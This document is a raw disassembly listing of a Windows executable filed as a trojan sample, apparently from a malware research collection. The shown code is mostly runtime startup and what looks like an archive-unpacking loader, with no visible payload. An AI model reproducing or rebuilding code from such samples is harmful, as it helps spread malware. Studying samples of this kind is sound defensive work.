
malware_samples/trojan/6782c5111abd17435851432895b55cc6371d323a06d710801551cea800bf65d0.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	f3 c3                	repz ret
  401002:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401009:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401010:	83 ec 1c             	sub    $0x1c,%esp
  401013:	31 c0                	xor    %eax,%eax
  401015:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40101c:	4d 5a 
  40101e:	c7 05 cc d2 41 00 01 	movl   $0x1,0x41d2cc
  401025:	00 00 00 
  401028:	c7 05 c8 d2 41 00 01 	movl   $0x1,0x41d2c8
  40102f:	00 00 00 
  401032:	c7 05 c4 d2 41 00 01 	movl   $0x1,0x41d2c4
  401039:	00 00 00 
  40103c:	c7 05 d4 d2 41 00 01 	movl   $0x1,0x41d2d4
  401043:	00 00 00 
  401046:	74 68                	je     0x4010b0
  401048:	a3 08 10 41 00       	mov    %eax,0x411008
  40104d:	a1 d8 d2 41 00       	mov    0x41d2d8,%eax
  401052:	85 c0                	test   %eax,%eax
  401054:	74 4a                	je     0x4010a0
  401056:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
  40105d:	e8 2e 97 00 00       	call   0x40a790
  401062:	c7 04 24 ff ff ff ff 	movl   $0xffffffff,(%esp)
  401069:	e8 12 86 00 00       	call   0x409680
  40106e:	8b 15 dc d2 41 00    	mov    0x41d2dc,%edx
  401074:	a3 78 d6 41 00       	mov    %eax,0x41d678
  401079:	a3 7c d6 41 00       	mov    %eax,0x41d67c
  40107e:	a1 d8 e2 41 00       	mov    0x41e2d8,%eax
  401083:	89 10                	mov    %edx,(%eax)
  401085:	e8 36 88 00 00       	call   0x4098c0
  40108a:	83 3d 20 b0 40 00 01 	cmpl   $0x1,0x40b020
  401091:	74 6d                	je     0x401100
  401093:	31 c0                	xor    %eax,%eax
  401095:	83 c4 1c             	add    $0x1c,%esp
  401098:	c3                   	ret
  401099:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4010a0:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  4010a7:	e8 e4 96 00 00       	call   0x40a790
  4010ac:	eb b4                	jmp    0x401062
  4010ae:	66 90                	xchg   %ax,%ax
  4010b0:	8b 15 3c 00 40 00    	mov    0x40003c,%edx
  4010b6:	81 ba 00 00 40 00 50 	cmpl   $0x4550,0x400000(%edx)
  4010bd:	45 00 00 
  4010c0:	8d 8a 00 00 40 00    	lea    0x400000(%edx),%ecx
  4010c6:	75 80                	jne    0x401048
  4010c8:	0f b7 51 18          	movzwl 0x18(%ecx),%edx
  4010cc:	66 81 fa 0b 01       	cmp    $0x10b,%dx
  4010d1:	74 3f                	je     0x401112
  4010d3:	66 81 fa 0b 02       	cmp    $0x20b,%dx
  4010d8:	0f 85 6a ff ff ff    	jne    0x401048
  4010de:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%ecx)
  4010e5:	0f 86 5d ff ff ff    	jbe    0x401048
  4010eb:	8b 91 f8 00 00 00    	mov    0xf8(%ecx),%edx
  4010f1:	31 c0                	xor    %eax,%eax
  4010f3:	85 d2                	test   %edx,%edx
  4010f5:	0f 95 c0             	setne  %al
  4010f8:	e9 4b ff ff ff       	jmp    0x401048
  4010fd:	8d 76 00             	lea    0x0(%esi),%esi
  401100:	c7 04 24 30 99 40 00 	movl   $0x409930,(%esp)
  401107:	e8 14 88 00 00       	call   0x409920
  40110c:	31 c0                	xor    %eax,%eax
  40110e:	83 c4 1c             	add    $0x1c,%esp
  401111:	c3                   	ret
  401112:	83 79 74 0e          	cmpl   $0xe,0x74(%ecx)
  401116:	0f 86 2c ff ff ff    	jbe    0x401048
  40111c:	8b 89 e8 00 00 00    	mov    0xe8(%ecx),%ecx
  401122:	31 c0                	xor    %eax,%eax
  401124:	85 c9                	test   %ecx,%ecx
  401126:	0f 95 c0             	setne  %al
  401129:	e9 1a ff ff ff       	jmp    0x401048
  40112e:	66 90                	xchg   %ax,%ax
  401130:	83 ec 2c             	sub    $0x2c,%esp
  401133:	a1 e0 d2 41 00       	mov    0x41d2e0,%eax
  401138:	c7 44 24 10 00 10 41 	movl   $0x411000,0x10(%esp)
  40113f:	00 
  401140:	c7 44 24 08 14 10 41 	movl   $0x411014,0x8(%esp)
  401147:	00 
  401148:	c7 44 24 04 18 10 41 	movl   $0x411018,0x4(%esp)
  40114f:	00 
  401150:	a3 00 10 41 00       	mov    %eax,0x411000
  401155:	a1 0c b0 40 00       	mov    0x40b00c,%eax
  40115a:	c7 04 24 1c 10 41 00 	movl   $0x41101c,(%esp)
  401161:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401165:	e8 2e 96 00 00       	call   0x40a798
  40116a:	a3 10 10 41 00       	mov    %eax,0x411010
  40116f:	83 c4 2c             	add    $0x2c,%esp
  401172:	c3                   	ret
  401173:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  401179:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401180:	55                   	push   %ebp
  401181:	31 c0                	xor    %eax,%eax
  401183:	89 e5                	mov    %esp,%ebp
  401185:	b9 11 00 00 00       	mov    $0x11,%ecx
  40118a:	57                   	push   %edi
  40118b:	56                   	push   %esi
  40118c:	8d 55 a4             	lea    -0x5c(%ebp),%edx
  40118f:	53                   	push   %ebx
  401190:	89 d7                	mov    %edx,%edi
  401192:	83 ec 7c             	sub    $0x7c,%esp
  401195:	f3 ab                	rep stos %eax,%es:(%edi)
  401197:	b0 30                	mov    $0x30,%al
  401199:	e8 b2 93 00 00       	call   0x40a550
  40119e:	29 c4                	sub    %eax,%esp
  4011a0:	8d 44 24 1b          	lea    0x1b(%esp),%eax
  4011a4:	83 e0 f0             	and    $0xfffffff0,%eax
  4011a7:	c7 00 cc cc cc cc    	movl   $0xcccccccc,(%eax)
  4011ad:	c7 40 04 cc cc cc cc 	movl   $0xcccccccc,0x4(%eax)
  4011b4:	c7 40 08 cc cc cc cc 	movl   $0xcccccccc,0x8(%eax)
  4011bb:	c7 40 0c cc cc cc cc 	movl   $0xcccccccc,0xc(%eax)
  4011c2:	c7 40 10 cc cc cc cc 	movl   $0xcccccccc,0x10(%eax)
  4011c9:	c7 40 14 cc cc cc cc 	movl   $0xcccccccc,0x14(%eax)
  4011d0:	c7 40 18 cc cc cc cc 	movl   $0xcccccccc,0x18(%eax)
  4011d7:	c7 40 1c cc cc cc cc 	movl   $0xcccccccc,0x1c(%eax)
  4011de:	83 e4 f0             	and    $0xfffffff0,%esp
  4011e1:	8b 35 d8 d2 41 00    	mov    0x41d2d8,%esi
  4011e7:	85 f6                	test   %esi,%esi
  4011e9:	0f 85 98 02 00 00    	jne    0x401487
  4011ef:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
  4011f5:	31 f6                	xor    %esi,%esi
  4011f7:	8b 58 04             	mov    0x4(%eax),%ebx
  4011fa:	8b 3d 7c e2 41 00    	mov    0x41e27c,%edi
  401200:	eb 14                	jmp    0x401216
  401202:	39 d8                	cmp    %ebx,%eax
  401204:	0f 84 1f 02 00 00    	je     0x401429
  40120a:	c7 04 24 e8 03 00 00 	movl   $0x3e8,(%esp)
  401211:	ff d7                	call   *%edi
  401213:	83 ec 04             	sub    $0x4,%esp
  401216:	89 f0                	mov    %esi,%eax
  401218:	f0 0f b1 1d 80 d6 41 	lock cmpxchg %ebx,0x41d680
  40121f:	00 
  401220:	85 c0                	test   %eax,%eax
  401222:	75 de                	jne    0x401202
  401224:	a1 84 d6 41 00       	mov    0x41d684,%eax
  401229:	31 db                	xor    %ebx,%ebx
  40122b:	83 f8 01             	cmp    $0x1,%eax
  40122e:	0f 84 08 02 00 00    	je     0x40143c
  401234:	a1 84 d6 41 00       	mov    0x41d684,%eax
  401239:	85 c0                	test   %eax,%eax
  40123b:	0f 84 57 02 00 00    	je     0x401498
  401241:	c7 05 04 10 41 00 01 	movl   $0x1,0x411004
  401248:	00 00 00 
  40124b:	a1 84 d6 41 00       	mov    0x41d684,%eax
  401250:	83 f8 01             	cmp    $0x1,%eax
  401253:	0f 84 fd 01 00 00    	je     0x401456
  401259:	85 db                	test   %ebx,%ebx
  40125b:	0f 84 1b 02 00 00    	je     0x40147c
  401261:	a1 50 02 41 00       	mov    0x410250,%eax
  401266:	85 c0                	test   %eax,%eax
  401268:	74 1c                	je     0x401286
  40126a:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401271:	00 
  401272:	c7 44 24 04 02 00 00 	movl   $0x2,0x4(%esp)
  401279:	00 
  40127a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401281:	ff d0                	call   *%eax
  401283:	83 ec 0c             	sub    $0xc,%esp
  401286:	e8 a5 88 00 00       	call   0x409b30
  40128b:	c7 04 24 70 97 40 00 	movl   $0x409770,(%esp)
  401292:	ff 15 78 e2 41 00    	call   *0x41e278
  401298:	83 ec 04             	sub    $0x4,%esp
  40129b:	a3 e4 d2 41 00       	mov    %eax,0x41d2e4
  4012a0:	c7 04 24 00 10 40 00 	movl   $0x401000,(%esp)
  4012a7:	e8 04 95 00 00       	call   0x40a7b0
  4012ac:	e8 1f 8b 00 00       	call   0x409dd0
  4012b1:	a1 18 e3 41 00       	mov    0x41e318,%eax
  4012b6:	c7 05 6c d6 41 00 00 	movl   $0x400000,0x41d66c
  4012bd:	00 40 00 
  4012c0:	8b 00                	mov    (%eax),%eax
  4012c2:	85 c0                	test   %eax,%eax
  4012c4:	74 46                	je     0x40130c
  4012c6:	31 c9                	xor    %ecx,%ecx
  4012c8:	eb 17                	jmp    0x4012e1
  4012ca:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4012d0:	66 85 d2             	test   %dx,%dx
  4012d3:	74 32                	je     0x401307
  4012d5:	85 c9                	test   %ecx,%ecx
  4012d7:	74 1f                	je     0x4012f8
  4012d9:	b9 01 00 00 00       	mov    $0x1,%ecx
  4012de:	83 c0 02             	add    $0x2,%eax
  4012e1:	0f b7 10             	movzwl (%eax),%edx
  4012e4:	66 83 fa 20          	cmp    $0x20,%dx
  4012e8:	76 e6                	jbe    0x4012d0
  4012ea:	89 cb                	mov    %ecx,%ebx
  4012ec:	83 f3 01             	xor    $0x1,%ebx
  4012ef:	66 83 fa 22          	cmp    $0x22,%dx
  4012f3:	0f 44 cb             	cmove  %ebx,%ecx
  4012f6:	eb e6                	jmp    0x4012de
  4012f8:	83 c0 02             	add    $0x2,%eax
  4012fb:	0f b7 38             	movzwl (%eax),%edi
  4012fe:	8d 57 ff             	lea    -0x1(%edi),%edx
  401301:	66 83 fa 1f          	cmp    $0x1f,%dx
  401305:	76 f1                	jbe    0x4012f8
  401307:	a3 68 d6 41 00       	mov    %eax,0x41d668
  40130c:	8b 1d d8 d2 41 00    	mov    0x41d2d8,%ebx
  401312:	85 db                	test   %ebx,%ebx
  401314:	74 15                	je     0x40132b
  401316:	0f b7 55 d4          	movzwl -0x2c(%ebp),%edx
  40131a:	b8 0a 00 00 00       	mov    $0xa,%eax
  40131f:	f6 45 d0 01          	testb  $0x1,-0x30(%ebp)
  401323:	0f 45 c2             	cmovne %edx,%eax
  401326:	a3 00 b0 40 00       	mov    %eax,0x40b000
  40132b:	a1 1c 10 41 00       	mov    0x41101c,%eax
  401330:	89 45 90             	mov    %eax,-0x70(%ebp)
  401333:	89 c7                	mov    %eax,%edi
  401335:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  40133c:	89 45 8c             	mov    %eax,-0x74(%ebp)
  40133f:	89 04 24             	mov    %eax,(%esp)
  401342:	e8 79 94 00 00       	call   0x40a7c0
  401347:	85 ff                	test   %edi,%edi
  401349:	8b 1d 18 10 41 00    	mov    0x411018,%ebx
  40134f:	89 45 94             	mov    %eax,-0x6c(%ebp)
  401352:	0f 8e 63 01 00 00    	jle    0x4014bb
  401358:	31 ff                	xor    %edi,%edi
  40135a:	89 fe                	mov    %edi,%esi
  40135c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401360:	8b 04 b3             	mov    (%ebx,%esi,4),%eax
  401363:	66 83 38 00          	cmpw   $0x0,(%eax)
  401367:	0f 84 b2 00 00 00    	je     0x40141f
  40136d:	b9 01 00 00 00       	mov    $0x1,%ecx
  401372:	83 c1 01             	add    $0x1,%ecx
  401375:	66 83 7c 48 fe 00    	cmpw   $0x0,-0x2(%eax,%ecx,2)
  40137b:	75 f5                	jne    0x401372
  40137d:	8d 3c 09             	lea    (%ecx,%ecx,1),%edi
  401380:	89 3c 24             	mov    %edi,(%esp)
  401383:	e8 38 94 00 00       	call   0x40a7c0
  401388:	8b 55 94             	mov    -0x6c(%ebp),%edx
  40138b:	89 04 b2             	mov    %eax,(%edx,%esi,4)
  40138e:	8b 14 b3             	mov    (%ebx,%esi,4),%edx
  401391:	83 c6 01             	add    $0x1,%esi
  401394:	89 7c 24 08          	mov    %edi,0x8(%esp)
  401398:	89 04 24             	mov    %eax,(%esp)
  40139b:	89 54 24 04          	mov    %edx,0x4(%esp)
  40139f:	e8 24 94 00 00       	call   0x40a7c8
  4013a4:	3b 75 90             	cmp    -0x70(%ebp),%esi
  4013a7:	75 b7                	jne    0x401360
  4013a9:	8b 45 8c             	mov    -0x74(%ebp),%eax
  4013ac:	83 e8 04             	sub    $0x4,%eax
  4013af:	8b 7d 94             	mov    -0x6c(%ebp),%edi
  4013b2:	c7 04 07 00 00 00 00 	movl   $0x0,(%edi,%eax,1)
  4013b9:	89 3d 18 10 41 00    	mov    %edi,0x411018
  4013bf:	e8 9c 8a 00 00       	call   0x409e60
  4013c4:	a1 bc e2 41 00       	mov    0x41e2bc,%eax
  4013c9:	8b 15 14 10 41 00    	mov    0x411014,%edx
  4013cf:	89 10                	mov    %edx,(%eax)
  4013d1:	a1 14 10 41 00       	mov    0x411014,%eax
  4013d6:	89 44 24 08          	mov    %eax,0x8(%esp)
  4013da:	a1 18 10 41 00       	mov    0x411018,%eax
  4013df:	89 44 24 04          	mov    %eax,0x4(%esp)
  4013e3:	a1 1c 10 41 00       	mov    0x41101c,%eax
  4013e8:	89 04 24             	mov    %eax,(%esp)
  4013eb:	e8 20 01 00 00       	call   0x401510
  4013f0:	8b 0d 08 10 41 00    	mov    0x411008,%ecx
  4013f6:	85 c9                	test   %ecx,%ecx
  4013f8:	a3 0c 10 41 00       	mov    %eax,0x41100c
  4013fd:	0f 84 bf 00 00 00    	je     0x4014c2
  401403:	8b 15 04 10 41 00    	mov    0x411004,%edx
  401409:	85 d2                	test   %edx,%edx
  40140b:	75 0a                	jne    0x401417
  40140d:	e8 be 93 00 00       	call   0x40a7d0
  401412:	a1 0c 10 41 00       	mov    0x41100c,%eax
  401417:	8d 65 f4             	lea    -0xc(%ebp),%esp
  40141a:	5b                   	pop    %ebx
  40141b:	5e                   	pop    %esi
  40141c:	5f                   	pop    %edi
  40141d:	5d                   	pop    %ebp
  40141e:	c3                   	ret
  40141f:	bf 02 00 00 00       	mov    $0x2,%edi
  401424:	e9 57 ff ff ff       	jmp    0x401380
  401429:	a1 84 d6 41 00       	mov    0x41d684,%eax
  40142e:	bb 01 00 00 00       	mov    $0x1,%ebx
  401433:	83 f8 01             	cmp    $0x1,%eax
  401436:	0f 85 f8 fd ff ff    	jne    0x401234
  40143c:	c7 04 24 1f 00 00 00 	movl   $0x1f,(%esp)
  401443:	e8 90 93 00 00       	call   0x40a7d8
  401448:	a1 84 d6 41 00       	mov    0x41d684,%eax
  40144d:	83 f8 01             	cmp    $0x1,%eax
  401450:	0f 85 03 fe ff ff    	jne    0x401259
  401456:	c7 44 24 04 08 f0 41 	movl   $0x41f008,0x4(%esp)
  40145d:	00 
  40145e:	c7 04 24 00 f0 41 00 	movl   $0x41f000,(%esp)
  401465:	e8 76 93 00 00       	call   0x40a7e0
  40146a:	85 db                	test   %ebx,%ebx
  40146c:	c7 05 84 d6 41 00 02 	movl   $0x2,0x41d684
  401473:	00 00 00 
  401476:	0f 85 e5 fd ff ff    	jne    0x401261
  40147c:	87 1d 80 d6 41 00    	xchg   %ebx,0x41d680
  401482:	e9 da fd ff ff       	jmp    0x401261
  401487:	89 14 24             	mov    %edx,(%esp)
  40148a:	ff 15 48 e2 41 00    	call   *0x41e248
  401490:	83 ec 04             	sub    $0x4,%esp
  401493:	e9 57 fd ff ff       	jmp    0x4011ef
  401498:	c7 05 84 d6 41 00 01 	movl   $0x1,0x41d684
  40149f:	00 00 00 
  4014a2:	c7 44 24 04 18 f0 41 	movl   $0x41f018,0x4(%esp)
  4014a9:	00 
  4014aa:	c7 04 24 0c f0 41 00 	movl   $0x41f00c,(%esp)
  4014b1:	e8 2a 93 00 00       	call   0x40a7e0
  4014b6:	e9 90 fd ff ff       	jmp    0x40124b
  4014bb:	31 c0                	xor    %eax,%eax
  4014bd:	e9 ed fe ff ff       	jmp    0x4013af
  4014c2:	89 04 24             	mov    %eax,(%esp)
  4014c5:	e8 1e 93 00 00       	call   0x40a7e8
  4014ca:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4014d0:	83 ec 0c             	sub    $0xc,%esp
  4014d3:	c7 05 d8 d2 41 00 01 	movl   $0x1,0x41d2d8
  4014da:	00 00 00 
  4014dd:	e8 9e 89 00 00       	call   0x409e80
  4014e2:	83 c4 0c             	add    $0xc,%esp
  4014e5:	e9 96 fc ff ff       	jmp    0x401180
  4014ea:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4014f0:	83 ec 0c             	sub    $0xc,%esp
  4014f3:	c7 05 d8 d2 41 00 00 	movl   $0x0,0x41d2d8
  4014fa:	00 00 00 
  4014fd:	e8 7e 89 00 00       	call   0x409e80
  401502:	83 c4 0c             	add    $0xc,%esp
  401505:	e9 76 fc ff ff       	jmp    0x401180
  40150a:	90                   	nop
  40150b:	90                   	nop
  40150c:	90                   	nop
  40150d:	90                   	nop
  40150e:	90                   	nop
  40150f:	90                   	nop
  401510:	53                   	push   %ebx
  401511:	83 ec 18             	sub    $0x18,%esp
  401514:	a1 b4 e2 41 00       	mov    0x41e2b4,%eax
  401519:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  40151d:	8b 00                	mov    (%eax),%eax
  40151f:	89 44 24 04          	mov    %eax,0x4(%esp)
  401523:	a1 a0 e2 41 00       	mov    0x41e2a0,%eax
  401528:	8b 00                	mov    (%eax),%eax
  40152a:	89 04 24             	mov    %eax,(%esp)
  40152d:	e8 ee 3b 00 00       	call   0x405120
  401532:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  401536:	89 44 24 24          	mov    %eax,0x24(%esp)
  40153a:	83 c4 18             	add    $0x18,%esp
  40153d:	5b                   	pop    %ebx
  40153e:	e9 7d 11 00 00       	jmp    0x4026c0
  401543:	90                   	nop
  401544:	90                   	nop
  401545:	90                   	nop
  401546:	90                   	nop
  401547:	90                   	nop
  401548:	90                   	nop
  401549:	90                   	nop
  40154a:	90                   	nop
  40154b:	90                   	nop
  40154c:	90                   	nop
  40154d:	90                   	nop
  40154e:	90                   	nop
  40154f:	90                   	nop
  401550:	57                   	push   %edi
  401551:	56                   	push   %esi
  401552:	83 ea 58             	sub    $0x58,%edx
  401555:	53                   	push   %ebx
  401556:	89 c3                	mov    %eax,%ebx
  401558:	83 ec 10             	sub    $0x10,%esp
  40155b:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401562:	00 
  401563:	89 54 24 04          	mov    %edx,0x4(%esp)
  401567:	8b 00                	mov    (%eax),%eax
  401569:	89 04 24             	mov    %eax,(%esp)
  40156c:	e8 7f 92 00 00       	call   0x40a7f0
  401571:	85 c0                	test   %eax,%eax
  401573:	75 40                	jne    0x4015b5
  401575:	8b 03                	mov    (%ebx),%eax
  401577:	8d 73 10             	lea    0x10(%ebx),%esi
  40157a:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  401581:	00 
  401582:	c7 44 24 04 58 00 00 	movl   $0x58,0x4(%esp)
  401589:	00 
  40158a:	89 34 24             	mov    %esi,(%esp)
  40158d:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401591:	e8 62 92 00 00       	call   0x40a7f8
  401596:	85 c0                	test   %eax,%eax
  401598:	74 1b                	je     0x4015b5
  40159a:	bf 00 c0 40 00       	mov    $0x40c000,%edi
  40159f:	b9 08 00 00 00       	mov    $0x8,%ecx
  4015a4:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  4015a6:	0f 95 c0             	setne  %al
  4015a9:	83 c4 10             	add    $0x10,%esp
  4015ac:	0f b6 c0             	movzbl %al,%eax
  4015af:	5b                   	pop    %ebx
  4015b0:	f7 d8                	neg    %eax
  4015b2:	5e                   	pop    %esi
  4015b3:	5f                   	pop    %edi
  4015b4:	c3                   	ret
  4015b5:	83 c4 10             	add    $0x10,%esp
  4015b8:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4015bd:	5b                   	pop    %ebx
  4015be:	5e                   	pop    %esi
  4015bf:	5f                   	pop    %edi
  4015c0:	c3                   	ret
  4015c1:	eb 0d                	jmp    0x4015d0
  4015c3:	90                   	nop
  4015c4:	90                   	nop
  4015c5:	90                   	nop
  4015c6:	90                   	nop
  4015c7:	90                   	nop
  4015c8:	90                   	nop
  4015c9:	90                   	nop
  4015ca:	90                   	nop
  4015cb:	90                   	nop
  4015cc:	90                   	nop
  4015cd:	90                   	nop
  4015ce:	90                   	nop
  4015cf:	90                   	nop
  4015d0:	56                   	push   %esi
  4015d1:	53                   	push   %ebx
  4015d2:	83 ec 14             	sub    $0x14,%esp
  4015d5:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  4015d9:	8b 74 24 20          	mov    0x20(%esp),%esi
  4015dd:	8b 03                	mov    (%ebx),%eax
  4015df:	89 04 24             	mov    %eax,(%esp)
  4015e2:	ff 15 b8 e3 41 00    	call   *0x41e3b8
  4015e8:	83 ec 04             	sub    $0x4,%esp
  4015eb:	01 d8                	add    %ebx,%eax
  4015ed:	3b 46 08             	cmp    0x8(%esi),%eax
  4015f0:	73 0f                	jae    0x401601
  4015f2:	c7 04 24 0c c0 40 00 	movl   $0x40c00c,(%esp)
  4015f9:	e8 12 08 00 00       	call   0x401e10
  4015fe:	8b 46 0c             	mov    0xc(%esi),%eax
  401601:	83 c4 14             	add    $0x14,%esp
  401604:	5b                   	pop    %ebx
  401605:	5e                   	pop    %esi
  401606:	c3                   	ret
  401607:	89 f6                	mov    %esi,%esi
  401609:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401610:	55                   	push   %ebp
  401611:	57                   	push   %edi
  401612:	56                   	push   %esi
  401613:	53                   	push   %ebx
  401614:	83 ec 6c             	sub    $0x6c,%esp
  401617:	8b 9c 24 80 00 00 00 	mov    0x80(%esp),%ebx
  40161e:	8b bc 24 84 00 00 00 	mov    0x84(%esp),%edi
  401625:	8b 03                	mov    (%ebx),%eax
  401627:	85 c0                	test   %eax,%eax
  401629:	0f 84 61 01 00 00    	je     0x401790
  40162f:	8b 73 04             	mov    0x4(%ebx),%esi
  401632:	8b 47 04             	mov    0x4(%edi),%eax
  401635:	8b 2d b8 e3 41 00    	mov    0x41e3b8,%ebp
  40163b:	89 04 24             	mov    %eax,(%esp)
  40163e:	ff d5                	call   *%ebp
  401640:	83 ec 04             	sub    $0x4,%esp
  401643:	01 c6                	add    %eax,%esi
  401645:	89 74 24 04          	mov    %esi,0x4(%esp)
  401649:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401650:	00 
  401651:	8b 03                	mov    (%ebx),%eax
  401653:	89 04 24             	mov    %eax,(%esp)
  401656:	e8 95 91 00 00       	call   0x40a7f0
  40165b:	8b 47 08             	mov    0x8(%edi),%eax
  40165e:	89 04 24             	mov    %eax,(%esp)
  401661:	ff d5                	call   *%ebp
  401663:	83 ec 04             	sub    $0x4,%esp
  401666:	89 04 24             	mov    %eax,(%esp)
  401669:	e8 52 91 00 00       	call   0x40a7c0
  40166e:	85 c0                	test   %eax,%eax
  401670:	89 c6                	mov    %eax,%esi
  401672:	0f 84 5b 01 00 00    	je     0x4017d3
  401678:	8b 13                	mov    (%ebx),%edx
  40167a:	8b 47 08             	mov    0x8(%edi),%eax
  40167d:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  401681:	89 04 24             	mov    %eax,(%esp)
  401684:	ff d5                	call   *%ebp
  401686:	83 ec 04             	sub    $0x4,%esp
  401689:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  40168d:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  401694:	00 
  401695:	89 44 24 04          	mov    %eax,0x4(%esp)
  401699:	89 34 24             	mov    %esi,(%esp)
  40169c:	89 54 24 0c          	mov    %edx,0xc(%esp)
  4016a0:	e8 53 91 00 00       	call   0x40a7f8
  4016a5:	85 c0                	test   %eax,%eax
  4016a7:	0f 84 13 01 00 00    	je     0x4017c0
  4016ad:	80 7f 10 01          	cmpb   $0x1,0x10(%edi)
  4016b1:	74 1e                	je     0x4016d1
  4016b3:	8b 03                	mov    (%ebx),%eax
  4016b5:	85 c0                	test   %eax,%eax
  4016b7:	74 0e                	je     0x4016c7
  4016b9:	89 04 24             	mov    %eax,(%esp)
  4016bc:	e8 3f 91 00 00       	call   0x40a800
  4016c1:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  4016c7:	83 c4 6c             	add    $0x6c,%esp
  4016ca:	89 f0                	mov    %esi,%eax
  4016cc:	5b                   	pop    %ebx
  4016cd:	5e                   	pop    %esi
  4016ce:	5f                   	pop    %edi
  4016cf:	5d                   	pop    %ebp
  4016d0:	c3                   	ret
  4016d1:	e8 2a 40 00 00       	call   0x405700
  4016d6:	8b 47 0c             	mov    0xc(%edi),%eax
  4016d9:	89 04 24             	mov    %eax,(%esp)
  4016dc:	ff d5                	call   *%ebp
  4016de:	83 ec 04             	sub    $0x4,%esp
  4016e1:	89 04 24             	mov    %eax,(%esp)
  4016e4:	e8 d7 90 00 00       	call   0x40a7c0
  4016e9:	85 c0                	test   %eax,%eax
  4016eb:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4016ef:	0f 84 45 01 00 00    	je     0x40183a
  4016f5:	8b 47 08             	mov    0x8(%edi),%eax
  4016f8:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%esp)
  4016ff:	00 
  401700:	c7 44 24 4c 00 00 00 	movl   $0x0,0x4c(%esp)
  401707:	00 
  401708:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%esp)
  40170f:	00 
  401710:	89 74 24 28          	mov    %esi,0x28(%esp)
  401714:	89 04 24             	mov    %eax,(%esp)
  401717:	ff d5                	call   *%ebp
  401719:	83 ec 04             	sub    $0x4,%esp
  40171c:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  401720:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401724:	89 44 24 34          	mov    %eax,0x34(%esp)
  401728:	8b 47 0c             	mov    0xc(%edi),%eax
  40172b:	89 04 24             	mov    %eax,(%esp)
  40172e:	ff d5                	call   *%ebp
  401730:	83 ec 04             	sub    $0x4,%esp
  401733:	8d 6c 24 28          	lea    0x28(%esp),%ebp
  401737:	c7 44 24 08 38 00 00 	movl   $0x38,0x8(%esp)
  40173e:	00 
  40173f:	c7 44 24 04 93 c0 40 	movl   $0x40c093,0x4(%esp)
  401746:	00 
  401747:	89 44 24 38          	mov    %eax,0x38(%esp)
  40174b:	89 2c 24             	mov    %ebp,(%esp)
  40174e:	e8 6d 44 00 00       	call   0x405bc0
  401753:	85 c0                	test   %eax,%eax
  401755:	0f 88 8b 00 00 00    	js     0x4017e6
  40175b:	c7 44 24 04 04 00 00 	movl   $0x4,0x4(%esp)
  401762:	00 
  401763:	89 2c 24             	mov    %ebp,(%esp)
  401766:	e8 f5 44 00 00       	call   0x405c60
  40176b:	85 c0                	test   %eax,%eax
  40176d:	0f 88 ad 00 00 00    	js     0x401820
  401773:	89 2c 24             	mov    %ebp,(%esp)
  401776:	e8 b5 63 00 00       	call   0x407b30
  40177b:	89 34 24             	mov    %esi,(%esp)
  40177e:	e8 85 90 00 00       	call   0x40a808
  401783:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  401787:	e9 27 ff ff ff       	jmp    0x4016b3
  40178c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401790:	8d 43 68             	lea    0x68(%ebx),%eax
  401793:	c7 44 24 04 2c c0 40 	movl   $0x40c02c,0x4(%esp)
  40179a:	00 
  40179b:	89 04 24             	mov    %eax,(%esp)
  40179e:	e8 8d 16 00 00       	call   0x402e30
  4017a3:	85 c0                	test   %eax,%eax
  4017a5:	89 03                	mov    %eax,(%ebx)
  4017a7:	0f 85 82 fe ff ff    	jne    0x40162f
  4017ad:	c7 04 24 d3 c0 40 00 	movl   $0x40c0d3,(%esp)
  4017b4:	31 f6                	xor    %esi,%esi
  4017b6:	e8 55 06 00 00       	call   0x401e10
  4017bb:	e9 07 ff ff ff       	jmp    0x4016c7
  4017c0:	c7 04 24 50 c0 40 00 	movl   $0x40c050,(%esp)
  4017c7:	31 f6                	xor    %esi,%esi
  4017c9:	e8 42 06 00 00       	call   0x401e10
  4017ce:	e9 f4 fe ff ff       	jmp    0x4016c7
  4017d3:	c7 04 24 30 c0 40 00 	movl   $0x40c030,(%esp)
  4017da:	31 f6                	xor    %esi,%esi
  4017dc:	e8 2f 06 00 00       	call   0x401e10
  4017e1:	e9 e1 fe ff ff       	jmp    0x4016c7
  4017e6:	8b 54 24 40          	mov    0x40(%esp),%edx
  4017ea:	89 44 24 04          	mov    %eax,0x4(%esp)
